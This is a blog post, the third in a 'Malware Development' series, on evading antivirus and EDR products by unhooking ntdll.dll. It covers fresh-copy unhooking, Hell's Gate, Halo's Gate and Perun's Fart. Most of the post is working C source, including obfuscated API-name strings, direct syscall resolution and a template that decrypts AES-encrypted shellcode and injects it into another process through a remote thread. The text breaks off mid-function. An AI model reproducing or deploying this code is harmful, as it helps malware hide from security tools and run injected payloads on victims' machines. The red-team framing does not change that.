# https://medium.com/@0xHossam/unhooking-memory-object-hiding-3229b75618f7

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# AV/EDR Evasion \| Malware Development P — 3

[![Hossam Ehab](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)](https://medium.com/@0xHossam?source=post_page---byline--3229b75618f7---------------------------------------)

[Hossam Ehab](https://medium.com/@0xHossam?source=post_page---byline--3229b75618f7---------------------------------------)

Follow

16 min read

·

May 14, 2023

556

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D3229b75618f7&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%400xHossam%2Funhooking-memory-object-hiding-3229b75618f7&source=---header_actions--3229b75618f7---------------------post_audio_button------------------)

Share

## Unhooking & Memory Object Hiding

Before we delve into the topic, allow me to reintroduce myself and provide a brief overview of this playlist. My name is Hossam Ehab and I’m here to guide you through the realm of anti-virus (AV) evasion and the techniques used to bypass Endpoint Detection and Response (EDR) systems. This playlist aims to assist you in red team operations by providing insights into the intricate world of AV/EDR evasion.

Today, we will focus on two crucial aspects: Unhooking and Memory Object Hiding. These techniques play a significant role in evading AV and EDR systems, ensuring the stealth and effectiveness of malware development. In the red teaming process, encountering EDRs is almost inevitable, making it essential to equip ourselves with the necessary knowledge to counter their detection mechanisms.

To gain a comprehensive understanding of Unhooking and Memory Object Hiding, it is recommended to read the previous two parts of this series. These articles provide detailed insights into the subject matter:

Part 1 : [AV/EDR Evasion \| Malware Development \| by Hossam Ehab \| Medium](https://medium.com/@0xHossam/av-edr-evasion-malware-development-933e50f47af5)

Part 2 : [AV/EDR Evasion \| Malware Development — P2 \| by Hossam Ehab \| Medium](https://medium.com/@0xHossam/av-edr-evasion-malware-development-p2-7a947f7db354)

By exploring these articles, you will gain a solid foundation in AV/EDR evasion techniques, setting the stage for our discussion on Unhooking and Memory Object Hiding. Stay tuned for an in-depth exploration of these topics and their practical applications in red team operations.

Remember, knowledge and preparation are key in navigating the ever-evolving landscape of AV/EDR evasion. Let’s continue this journey together, empowering ourselves with the tools and techniques necessary to achieve success.

To fully grasp the concept of unhooking, it is crucial to understand the underlying principle of “hooking” itself. APIs (application programming interfaces) serve as a means for software code to execute specific actions within a computer system. In Windows, there are APIs like syscall that enable direct system or kernel-level access for executing instructions.

In the realm of EDR (Endpoint Detection and Response) solutions, these security tools often employ a technique called “hooking” to monitor and identify suspicious activities. This is achieved by injecting their own code into a specific Windows component known as ntdll.dll, which acts as a gateway for various system operations.

Now, unhooking comes into play as a method employed by attackers to replace the hooked version of ntdll.dll with a fresh, unhooked version. They carry out this process after Windows has already loaded the EDR-hooked version during the process launch. By doing so, the EDR solution remains unaware of any subsequent code execution, losing its ability to monitor the return address for API calls. Consequently, it becomes ineffective in detecting and responding to potential threats.

In more sophisticated attacks, hackers may take their efforts a step further by “re-hooking” the EDR solution towards the end of their operation. This involves restoring the original hooked version of ntdll.dll, effectively erasing any traces of suspicious activity and making it appear as though nothing untoward had occurred.

By understanding the mechanics of hooking and unhooking, it becomes evident how attackers can manipulate EDR systems to evade detection and carry out their malicious actions undetected.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*vW_p2wVPA0O-jItN.png)

## Unhooking Techniques:

Let’s see now how to see the hook bytes and how to unhook, First let’s see how the malware have been hooked by the EDR

1. Open x64 dbg
2. Run your malware or any program and attach it
3. Go to Symbols section then go to the ntdll.dll part
4. Search for NtAdjustPrivilegesToken and click it.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*vAqDkrHuhvsZ0L9w86msxg.png)

And now it’s jmp instruction It’s hooked!, so in real scinarios malwares remove this instruction, and like we said that there are many techniques so what are the techniques for unhooking?

1. Unhook by fresh ntdll copy. This is a very famous technique used by hackers and malware authors, the hacker starts to parse the ntdll to find the .text section

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*peChmLHBixZQX77_.jpg)

Then we copy fresh .text section into ntdll memory and let’s see the function code

```
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
/*
    UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
*/
 DWORD oldprotect = 0;
 PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pMapping;
 PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pMapping + pImgDOSHead->e_lfanew);
 int i;

 unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

 VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);

 // find .text section
 for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
  PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
            ((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

  if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
   // prepare ntdll.dll memory region for write permissions.
   VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
       pImgSectionHead->Misc.VirtualSize,
       PAGE_EXECUTE_READWRITE,
       &oldprotect);
   if (!oldprotect) {
     // RWX failed!
     return -1;
   }
   // copy fresh .text section into ntdll memory
   memcpy( (LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
     (LPVOID)((DWORD_PTR) pMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
     pImgSectionHead->Misc.VirtualSize);

   // restore original protection settings of ntdll memory
   VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
       pImgSectionHead->Misc.VirtualSize,
       oldprotect,
       &oldprotect);
   if (!oldprotect) {
     // it failed
     return -1;
   }
   return 0;
  }
 }

 // failed? .text not found!
 return -1;
}
```

```
int main(void) {

 int pid = 0;
    HANDLE hProc = NULL;

 //unsigned char sNtdllPath[] = "c:\\windows\\system32\\";
 unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };

 unsigned char sCreateFileMappingA[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0x0 };
 unsigned char sMapViewOfFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0x0 };
 unsigned char sUnmapViewOfFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0x0 };

 unsigned int sNtdllPath_len = sizeof(sNtdllPath);
 unsigned int sNtdll_len = sizeof(sNtdll);
 int ret = 0;
 HANDLE hFile;
 HANDLE hFileMapping;
 LPVOID pMapping;

 // get function pointers
 CreateFileMappingA_t CreateFileMappingA_p = (CreateFileMappingA_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFileMappingA);
 MapViewOfFile_t MapViewOfFile_p = (MapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sMapViewOfFile);
 UnmapViewOfFile_t UnmapViewOfFile_p = (UnmapViewOfFile_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sUnmapViewOfFile);

 // open ntdll.dll
 XORcrypt((char *) sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
 hFile = CreateFile((LPCSTR) sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 if ( hFile == INVALID_HANDLE_VALUE ) {
   // failed to open ntdll.dll
   return -1;
 }

 // prepare file mapping
 hFileMapping = CreateFileMappingA_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
 if (! hFileMapping) {
   // file mapping failed
   CloseHandle(hFile);
   return -1;
 }

 // map the bastard
 pMapping = MapViewOfFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
 if (!pMapping) {
     // mapping failed
     CloseHandle(hFileMapping);
     CloseHandle(hFile);
     return -1;
 }

 printf("Check 1!\n"); getchar();

 // remove hooks
 ret = UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), pMapping);

 printf("Check 2!\n"); getchar();

 // Clean up.
 UnmapViewOfFile_p(pMapping);
 CloseHandle(hFileMapping);
 CloseHandle(hFile);

}
```

The code is very easy we only remove any hooks or modifications applied to the `.text` segment of the `ntdll.dll` module, ensuring that the original code is restored and then in the end we close the handles. Let’s see now in the debugger.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*J4ZzkxvLtJCeezmHXuWIBw.png)

Now it removed ^\_^

The second unhooking technique is called “Hells Gate.” Initially, understanding this technique may seem a bit challenging, but it is actually quite straightforward and fascinating. Let’s delve into how it works.

## Get Hossam Ehab’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

First, we need to obtain the hash for the function we are interested in. For instance, let’s consider the function NTAllocateVirtualMemory, which has a hash value of 0xf5bd373480a6b89b. Once we have the hash, we attempt to allocate it in ntdll.

In the Hells Gate technique, we search for specific instructions. If we successfully locate these instructions, it indicates that the function has been hooked. This step involves matching the hashes and identifying the relevant instructions. Finally, I will provide the complete code for this process.

```
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
 PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
 PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
 PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

 for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
  PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
  PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

  if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
   pVxTableEntry->pAddress = pFunctionAddress;

   // Quick and dirty fix in case the function has been hooked
   WORD cw = 0;
   while (TRUE) {
    // check if syscall, in this case we are too far
    if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
     return FALSE;

    // check if ret, in this case we are also probaly too far
    if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
     return FALSE;

    // First opcodes should be :
    //    MOV R10, RCX
    //    MOV RCX, <syscall>
    if (*((PBYTE)pFunctionAddress + cw) == 0x4c
     && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
     && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
     && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
     && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
     && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
     BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
     BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
     pVxTableEntry->wSystemCall = (high << 8) | low;
     break;
    }

    cw++;
   };
  }
 }

 return TRUE;
}
```

This is the instructions that we finding it

MOV R10, RCX

MOV RCX, <syscall>

In this image :

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*8I02SWEiggT65s3-rgjy_w.png)

The rays that i have been put it is the same thing in the code i mentioned :

```
if (*((PBYTE)pFunctionAddress + cw) == 0x4c
     && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
     && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
     && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
     && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
```

The first is 4C, 8B, D1 and so on, this means that the function is hooked and then we try to unhook it while we stop to the “syscall” instruction in the image.

```
INT wmain() {
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

 PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
 PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
 if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
  return 0x1;

 // Get NTDLL module
 PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

 // Get the EAT of NTDLL
 PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
 if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
  return 0x01;

 VX_TABLE Table = { 0 };

 //__debugbreak();

 Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
 if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
  return 0x1;

 Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
 if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
  return 0x1;

 Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
 if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
  return 0x1;

 Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
 if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
  return 0x1;

 printf("VX_Table = %p\n", Table); getchar();

 Payload(&Table);
 return 0x00;
}
```

Here it will do the opration 4 time for each API and we will know it easly from the instructions i know it will be complex but really it’s easy

This is the full source code of this technique : [TartarusGate/main.c at master · trickster0/TartarusGate · GitHub](https://github.com/trickster0/TartarusGate/blob/master/HellsGate/main.c)

The third unhooking technique is called “Halo’s Gates.” It is an enhancement of Hells Gate that enables it to work with ntdll by dynamically resolving system call numbers. Unlike Hells Gate, where we have to specify the number, Halo’s Gates automates this process. To grasp this concept fully, it would be beneficial to examine it practically within a debugger.

Upon inspecting the code, we can observe some straightforward modifications compared to Hells Gate.

```
   // if hooked check the neighborhood to find clean syscall
   if (*((PBYTE)pFunctionAddress) == 0xe9) {

    for (WORD idx = 1; idx <= 500; idx++) {
     // check neighboring syscall down
     if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
      && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
      && *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
      && *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
      && *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
      && *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
      BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
      BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
      pVxTableEntry->wSystemCall = (high << 8) | low - idx;

      return TRUE;
     }
     // check neighboring syscall up
     if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
      && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
      && *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
      && *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
      && *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
      && *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
      BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
      BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
      pVxTableEntry->wSystemCall = (high << 8) | low + idx;

      return TRUE;
     }

    }
```

If you looking for the diffrent the 0xe9 that the thing we will look at it, now look at the debugger when i’m told you to go you will find jmp instruction in zwCreateThread and beside it you will find the 0xe9, In the code we make for loop that we after function function we add 1 as you see in the code then if we find 1 we take it’s syscall number we -it from the idx

github source code : [raulm0429/HalosGate-Cpl-C-: Halos Gate implementation in C++ (github.com)](https://github.com/raulm0429/HalosGate-Cpl-C-)

The fourth unhooking technique is known as “Veles’ Reek.” While there is no specific proof of concept (PoC) available, Abdallah Mohammed has implemented this technique. Reevel’s Reeks builds upon the concepts of both Halo’s Gates and Hell’s Gate.

What makes this technique particularly interesting is that if all the functions, including the ones implemented in Halo’s Gates and Hell’s Gate, when the all functions are hooked that’s impossible that the function will be unhooked so in the tool it will add 1 from the first function. This approach is quite remarkable, as it starts from the first function and progressively continues until it finds the hooked function.

For further information and implementation details, you can refer to Abdullah Elsharif’s repository on GitHub: 0xNinjaCyclone [/PowerLoad3r: Malicious PowerShell Scripts Loader Designed to Avoid Detection](https://github.com/abdallah-elsharif/PowerLoad3r).

The final technique I’d like to discuss is called “Pernus Fart.” This technique is quite intriguing, although it’s worth noting that modern Endpoint Detection and Response (EDR) systems can potentially detect it. The approach involves creating a new process in suspended mode, followed by parsing the ntdll to determine its size. Then, a new memory is created to accommodate the clean ntdll. Subsequently, the process is deleted since it is no longer needed.

With the clean ntdll in hand, the next step is to remove the hooks. This is achieved by identifying the “.text” section and modifying its protection to allow for copying the clean syscall table into the ntdll memory. To locate the hooked syscall, a creative method is employed: by identifying the beginning and ending bytes of the syscall, a match can be determined, indicating whether it has been hooked or not.

```
int FindFirstSyscall(char * pMem, DWORD size){

 // gets the first byte of first syscall
 DWORD i = 0;
 DWORD offset = 0;
 BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
 BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3

 // find first occurance of syscall+ret instructions
 for (i = 0; i < size - 3; i++) {
  if (!memcmp(pMem + i, pattern1, 3)) {
   offset = i;
   break;
  }
 }

 // now find the beginning of the syscall
 for (i = 3; i < 50 ; i++) {
  if (!memcmp(pMem + offset - i, pattern2, 3)) {
   offset = offset - i + 3;
   printf("First syscall found at 0x%p\n", pMem + offset);
   break;
  }
 }

 return offset;
}

int FindLastSysCall(char * pMem, DWORD size) {

 // returns the last byte of the last syscall
 DWORD i;
 DWORD offset = 0;
 BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3

 // backwards lookup
 for (i = size - 9; i > 0; i--) {
  if (!memcmp(pMem + i, pattern, 9)) {
   offset = i + 6;
   printf("Last syscall byte found at 0x%p\n", pMem + offset);
   break;
  }
 }

 return offset;
}
```

There are easier way of this in my tool : [https://github.com/0xHossam/Killer](https://github.com/0xHossam/Killer)

And here is the implementation by sektor7 ^\_^

```
/*

 Red Team Operator course code template
 Perun's Fart - unhooking ntdll w/o reading disk

 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// MessageBox shellcode - 64-bit
unsigned char payload[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };
unsigned char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };
unsigned int payload_len = sizeof(payload);

typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
 HCRYPTPROV hProv;
 HCRYPTHASH hHash;
 HCRYPTKEY hKey;

 if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
   return -1;
 }
 if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
   return -1;
 }
 if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
   return -1;
 }
 if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
   return -1;
 }

 if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
   return -1;
 }

 CryptReleaseContext(hProv, 0);
 CryptDestroyHash(hHash);
 CryptDestroyKey(hKey);

 return 0;
}

int FindTarget(const char *procname) {

 HANDLE hProcSnap;
 PROCESSENTRY32 pe32;
 int pid = 0;

 hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

 //printf("snapshot taken! %x\n", hProcSnap);
 pe32.dwSize = sizeof(PROCESSENTRY32);

 if (!Process32First(hProcSnap, &pe32)) {
   CloseHandle(hProcSnap);
   return 0;
 }

 //printf("going thru snapshot!\n");

 while (Process32Next(hProcSnap, &pe32)) {
  //printf("Found: %30s\n", pe32.szExeFile);
  if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
    pid = pe32.th32ProcessID;
    break;
  }
 }

 CloseHandle(hProcSnap);

 return pid;
}

// classic injection
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

 LPVOID pRemoteCode = NULL;
 HANDLE hThread = NULL;

 // Decrypt payload
 AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));

 pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
 WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

 hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
 if (hThread != NULL) {
   WaitForSingleObject(hThread, 500);
   CloseHandle(hThread);
   return 0;
 }
 return -1;
}

int FindFirstSyscall(char * pMem, DWORD size){

 // gets the first byte of first syscall
 DWORD i = 0;
 DWORD offset = 0;
 BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
 BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3

 // find first occurance of syscall+ret instructions
 for (i = 0; i < size - 3; i++) {
  if (!memcmp(pMem + i, pattern1, 3)) {
   offset = i;
   break;
  }
 }

 // now find the beginning of the syscall
 for (i = 3; i < 50 ; i++) {
  if (!memcmp(pMem + offset - i, pattern2, 3)) {
   offset = offset - i + 3;
   printf("First syscall found at 0x%p\n", pMem + offset);
   break;
  }
 }

 return offset;
}

int FindLastSysCall(char * pMem, DWORD size) {

 // returns the last byte of the last syscall
 DWORD i;
 DWORD offset = 0;
 BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3

 // backwards lookup
 for (i = size - 9; i > 0; i--) {
  if (!memcmp(pMem + i, pattern, 9)) {
   offset = i + 6;
   printf("Last syscall byte found at 0x%p\n", pMem + offset);
   break;
  }
 }

 return offset;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
/*
    UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
*/
 DWORD oldprotect = 0;
 PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
 PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);
 int i;

 unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };

 VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);

 // find .text section
 for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
  PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

  if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
   // prepare ntdll.dll memory region for write permissions.
   VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
       pImgSectionHead->Misc.VirtualSize,
       PAGE_EXECUTE_READWRITE,
       &oldprotect);
   if (!oldprotect) {
     // RWX failed!
     return -1;
   }

   // copy clean "syscall table" into ntdll memory
